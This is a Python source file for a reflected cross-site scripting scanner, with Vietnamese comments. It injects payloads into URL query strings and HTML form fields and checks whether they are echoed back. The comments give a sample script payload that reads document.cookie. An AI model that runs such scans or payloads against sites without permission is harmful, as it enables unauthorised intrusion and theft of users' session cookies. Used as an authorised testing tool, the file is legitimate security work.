from urllib.parse import urljoin, urlparse, urlencode, parse_qs
from bs4 import BeautifulSoup
from Logging import log as Log
from Logging import progressBar
from WebConfig import web

f = open("XSS/xss.txt", "r")
payloads = []
for pay in f.readlines():
    payloads.append(pay.strip())

"""
scan_form_in_url(url, vulnerable_url) :
 hàm này dùng để scan các lỗi xss thông qua thẻ <form> trong html cái này là cái chính đọc cho kỹ
 ví dụ nhá : 
 <form action="search.php?test=query" method="post"> 
      <label>search art</label> 
      <input name="searchFor" type="text" size="10"> 
      <input name="goButton" type="submit" value="go"> 
</form>

    thì để request trong python với một form như này module requests sẽ yêu cầu chuyền vào 
    tham số data={} (dạng dictionary)

    ví dụ như trong form trên thì requests yêu cầu data/param sẽ là {"searchFor":"duc dep trai","goButton":"goButton"}
    với logic như thế mình sẽ chèn payload vào form với dạng như sau {"searchFor":"<script>prompt(document.cookie)</script>","goButton":"goButton"}

    với hàm này ta sử dụng hàm BeautifulSoup để phân tích html nó sẽ phân tích html ra các thẻ và để tìm kiếm các thẻ ta 
    sử dụng hàm find_all
    ví dụ nhá :
    soup = BeautifulSoup(html.text, 'html.parser')
    forms = soup.find_all('form', method=True)
    còn cái bên dưới này là để lấy các giá trị trả về từ module requests
    html = web.getHTML(url) 
    
    - logic để tìm kiếm lỗi này là sau khi gửi đi request thì reponse trả về là một dạng html bây giờ ta sẽ phân tich 
    cái html đó nếu trong cái html mà có <script>prompt(document.cookie)</script> thì nó là có lỗi xss
"""


def scan_form_in_url(url, vulnerable_url, cookies=None):
    html = web.getHTML(url, cookies=cookies)

    if html:
        soup = BeautifulSoup(html.text, 'html.parser')
        forms = soup.find_all('form', method=True)

        for form in forms:
            # kiểm tra action hay còn gọi là phần query của một url ví dụ /account/login
            try:
                action = form['action']
            except KeyError:
                action = url

            try:
                # print('method : ' + form['method'])
                method = form['method'].lower().strip()
            except KeyError:
                method = 'get'

            i = 0
            for payload in payloads:
                keys = {}
                for key in form.find_all(["input", "textarea"]):
                    try:
                        if key['type'] == 'submit':
                            try:
                                keys.update({key['name']: key['name']})
                            except Exception as e:
                                keys.update({key['value']: key['value']})
                        else:
                            keys.update({key['name']: payload})
                    except Exception as e:
                        Log.warning('Internal error: ' + str(e))
                        if method.lower().strip() == 'get':
                            try:
                                keys.update({key['name']: payload})
                            except KeyError as e:
                                    Log.warning('Internal error: ' + str(e))
                # {'name' : '<script>alert(document.cookie)</script>',}
                # bat dau set requests (manh duc)
                final_url = urljoin(url, action)
                if method.lower().strip() == 'get':
                    req_html = web.getHTML(final_url, method=method.lower(), params=keys, cookies=cookies)
                    if payload in req_html.text:
                        Log.high(Log.R + ' Vulnerable deteced in url/form :' + final_url)
                        vulnerable_url.append([final_url, 'form', 'xss', payload])
                        break
                elif method.lower().strip() == 'post':
                    req_html = web.getHTML(final_url, method=method.lower(), data=keys, cookies=cookies)
                    if payload in req_html.text:
                        Log.high(Log.R + ' Vulnerable deteced in url/form :' + final_url)
                        vulnerable_url.append([final_url, 'form', 'xss', payload])
                        break


"""
scan_in_a_url(url, vulnerable_url):
    như này nhá :
    - thì một url như này https://manhducyeudeptrai.com//?id=1 thì sẽ có các thành phần 
    id=1 thành phần này gọi là query dùng để đưa dữ liệu cần tìm kiếm vào để tìm kiếm như ở đây nó sẽ tìm những thằng có id bằng 1
    theo cách này ta tìm cách  đẩy các dữ liệu không hợp lê (payload) vào cái thành phần query này 
    - để có thể tách được thành phần query này ra khỏi url thì mình dùng urlparse từ module urllib.parse
    ví dụ : queries = urlparse(url).query -> nó sẽ tách thành phần url thành id=1
    - ờm dcm thì sau khi tách được id=1 thì mình chèn payload vào nhá như này id=<script>prompt(document.cookie)</script>
    - rồi để có thể kiểm tra được thì ta sẽ phải nối thành phần url với thành phần query như này :
    https://manhducyeudeptrai.com/ +  id=<script>prompt(document.cookie)</script> -> https://manhducyeudeptrai.com/?id=<script>prompt(document.cookie)</script>
    - rồi sau đó mình request cái url để lấy html trả về nếu có <script>prompt(document.cookie)</script> thì nó có thể có lỗi xss
"""


def scan_in_a_url(url, vulnerable_url, cookies=None):
    queries = urlparse(url).query
    if queries != '':
        for payload in payloads:
            parser_query = []
            '''queries.split("&") = ['name=1','id=2']'''
            for query in queries.split("&"):
                parser_query.append(query[0:query.find('=') + 1])
            ''' parser_query = ['name=','id='] '''
            new_query = "&".join([param + payload for param in parser_query])
            ''' query = 'name=[payload]&id=[payload]' '''
            final_url = url.replace(queries, new_query, 1)
            # {'name' : }
            req_1 = web.getHTML(final_url, verify=False)

            encode_query = urlencode({x: payloads for x in parse_qs(queries)})
            final_encode_url = url.replace(queries, encode_query, 1)
            # source = web.getHTML(final_url)
            req_2 = web.getHTML(final_encode_url)

            if req_1:
                if payload in req_1.text or payload in req_2.text:
                    Log.high(Log.R + ' Vulnerable deteced in url :' + final_url)
                    vulnerable_url.append([final_url, 'url/href', 'xss', payload])
                    return True
        return False
    return False




"""cái này dùng để test thui"""


def scan_xss(url, method=2, cookies=None):
    vulnerable_url = []
    if method >= 2:
        scan_in_a_url(url, vulnerable_url)
        scan_form_in_url(url, vulnerable_url)
        if len(vulnerable_url):
            return True, vulnerable_url
        else:
            return False
    elif method == 1:
        scan_in_a_url(url, vulnerable_url)
        scan_form_in_url(url, vulnerable_url)
        if len(vulnerable_url):
            return True, vulnerable_url
        else:
            return False
    elif method == 0:
        scan_form_in_url(url, vulnerable_url)
        if len(vulnerable_url):
            return True, vulnerable_url
        else:
            return False
